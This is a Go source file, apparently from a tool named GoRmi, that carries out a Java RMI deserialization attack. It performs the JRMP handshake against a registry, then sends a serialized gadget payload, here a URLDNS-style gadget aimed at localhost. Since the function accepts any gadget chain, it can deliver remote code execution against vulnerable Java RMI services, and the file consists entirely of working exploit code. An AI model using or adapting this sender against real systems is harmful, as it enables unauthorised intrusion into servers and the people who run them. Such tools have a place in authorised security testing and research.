package main

import (
	"GoRmi/gadgets"
	"encoding/hex"
	"fmt"
	"net"
)
func SendData(ip string,port string,exp []byte)  {

	conn, err := net.Dial("tcp",ip+":"+port)
	if err != nil {
		fmt.Printf("conn server failed, err:%v\n", err)
		return
	}
	//发送固定的值
	data1 := []byte{
		0x4a, 0x52, 0x4d, 0x49, 0x00, 0x02, 0x4b,
	}
	_, err = conn.Write(data1)
	if err != nil {
		fmt.Printf("send data1 failed, err:%v\n", err)
		return
	}

	var buf1 [1024]byte
	_, err = conn.Read(buf1[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}

	//前面2个字节是后面ip的长度16进置
	//xx ip xxxx length:17 |000c 3139322e3136382e39362e31 00000000
	//data2 := []byte{
	//	0x00, 0x0c, 0x31, 0x39, 0x32, 0x2e, 0x31,
	//	0x36, 0x38, 0x2e, 0x39, 0x36, 0x2e, 0x31,
	//	0x00, 0x00, 0x00, 0x00,
	//}
	ipa :=[]byte(ip)
	aaa :=[]byte(string(len(ip)))
	toString := hex.EncodeToString(ipa)
	bbb := hex.EncodeToString(aaa)
	data:=("00"+bbb+toString+"00000000")
	data2, err := hex.DecodeString(data)
	_, err = conn.Write(data2)
	if err != nil {
		fmt.Printf("send data2 failed, err:%v\n", err)
		return
	}

	data3 := []byte{
		0x50, 0xac, 0xed, 0x00, 0x05, 0x77, 0x22,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x01, 0x44, 0x15, 0x4d, 0xc9, 0xd4, 0xe6,
		0x3b, 0xdf,
	}
	_, err = conn.Write(data3)
	if err != nil {
		fmt.Printf("send data3 failed, err:%v\n", err)
		return
	}

	var buf2 [1024]byte
	_, err = conn.Read(buf2[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}

	data4 := []byte{
		0x52,
	}
	_, err = conn.Write(data4)
	if err != nil {
		fmt.Printf("send data4 failed, err:%v\n", err)
		return
	}

	var buf3 [1024]byte
	_, err = conn.Read(buf3[:])
	if err != nil {
		fmt.Printf("read failed:%v\n", err)
		return
	}

	//最后发送exp 反序列化数据
	_, err = conn.Write(exp)
	if err != nil {
		fmt.Printf("send exp failed, err:%v\n", err)
		return
	}
}

func main()  {
	SendData("127.0.0.1","9001",gadgets.GetUrlDns("calc"))
}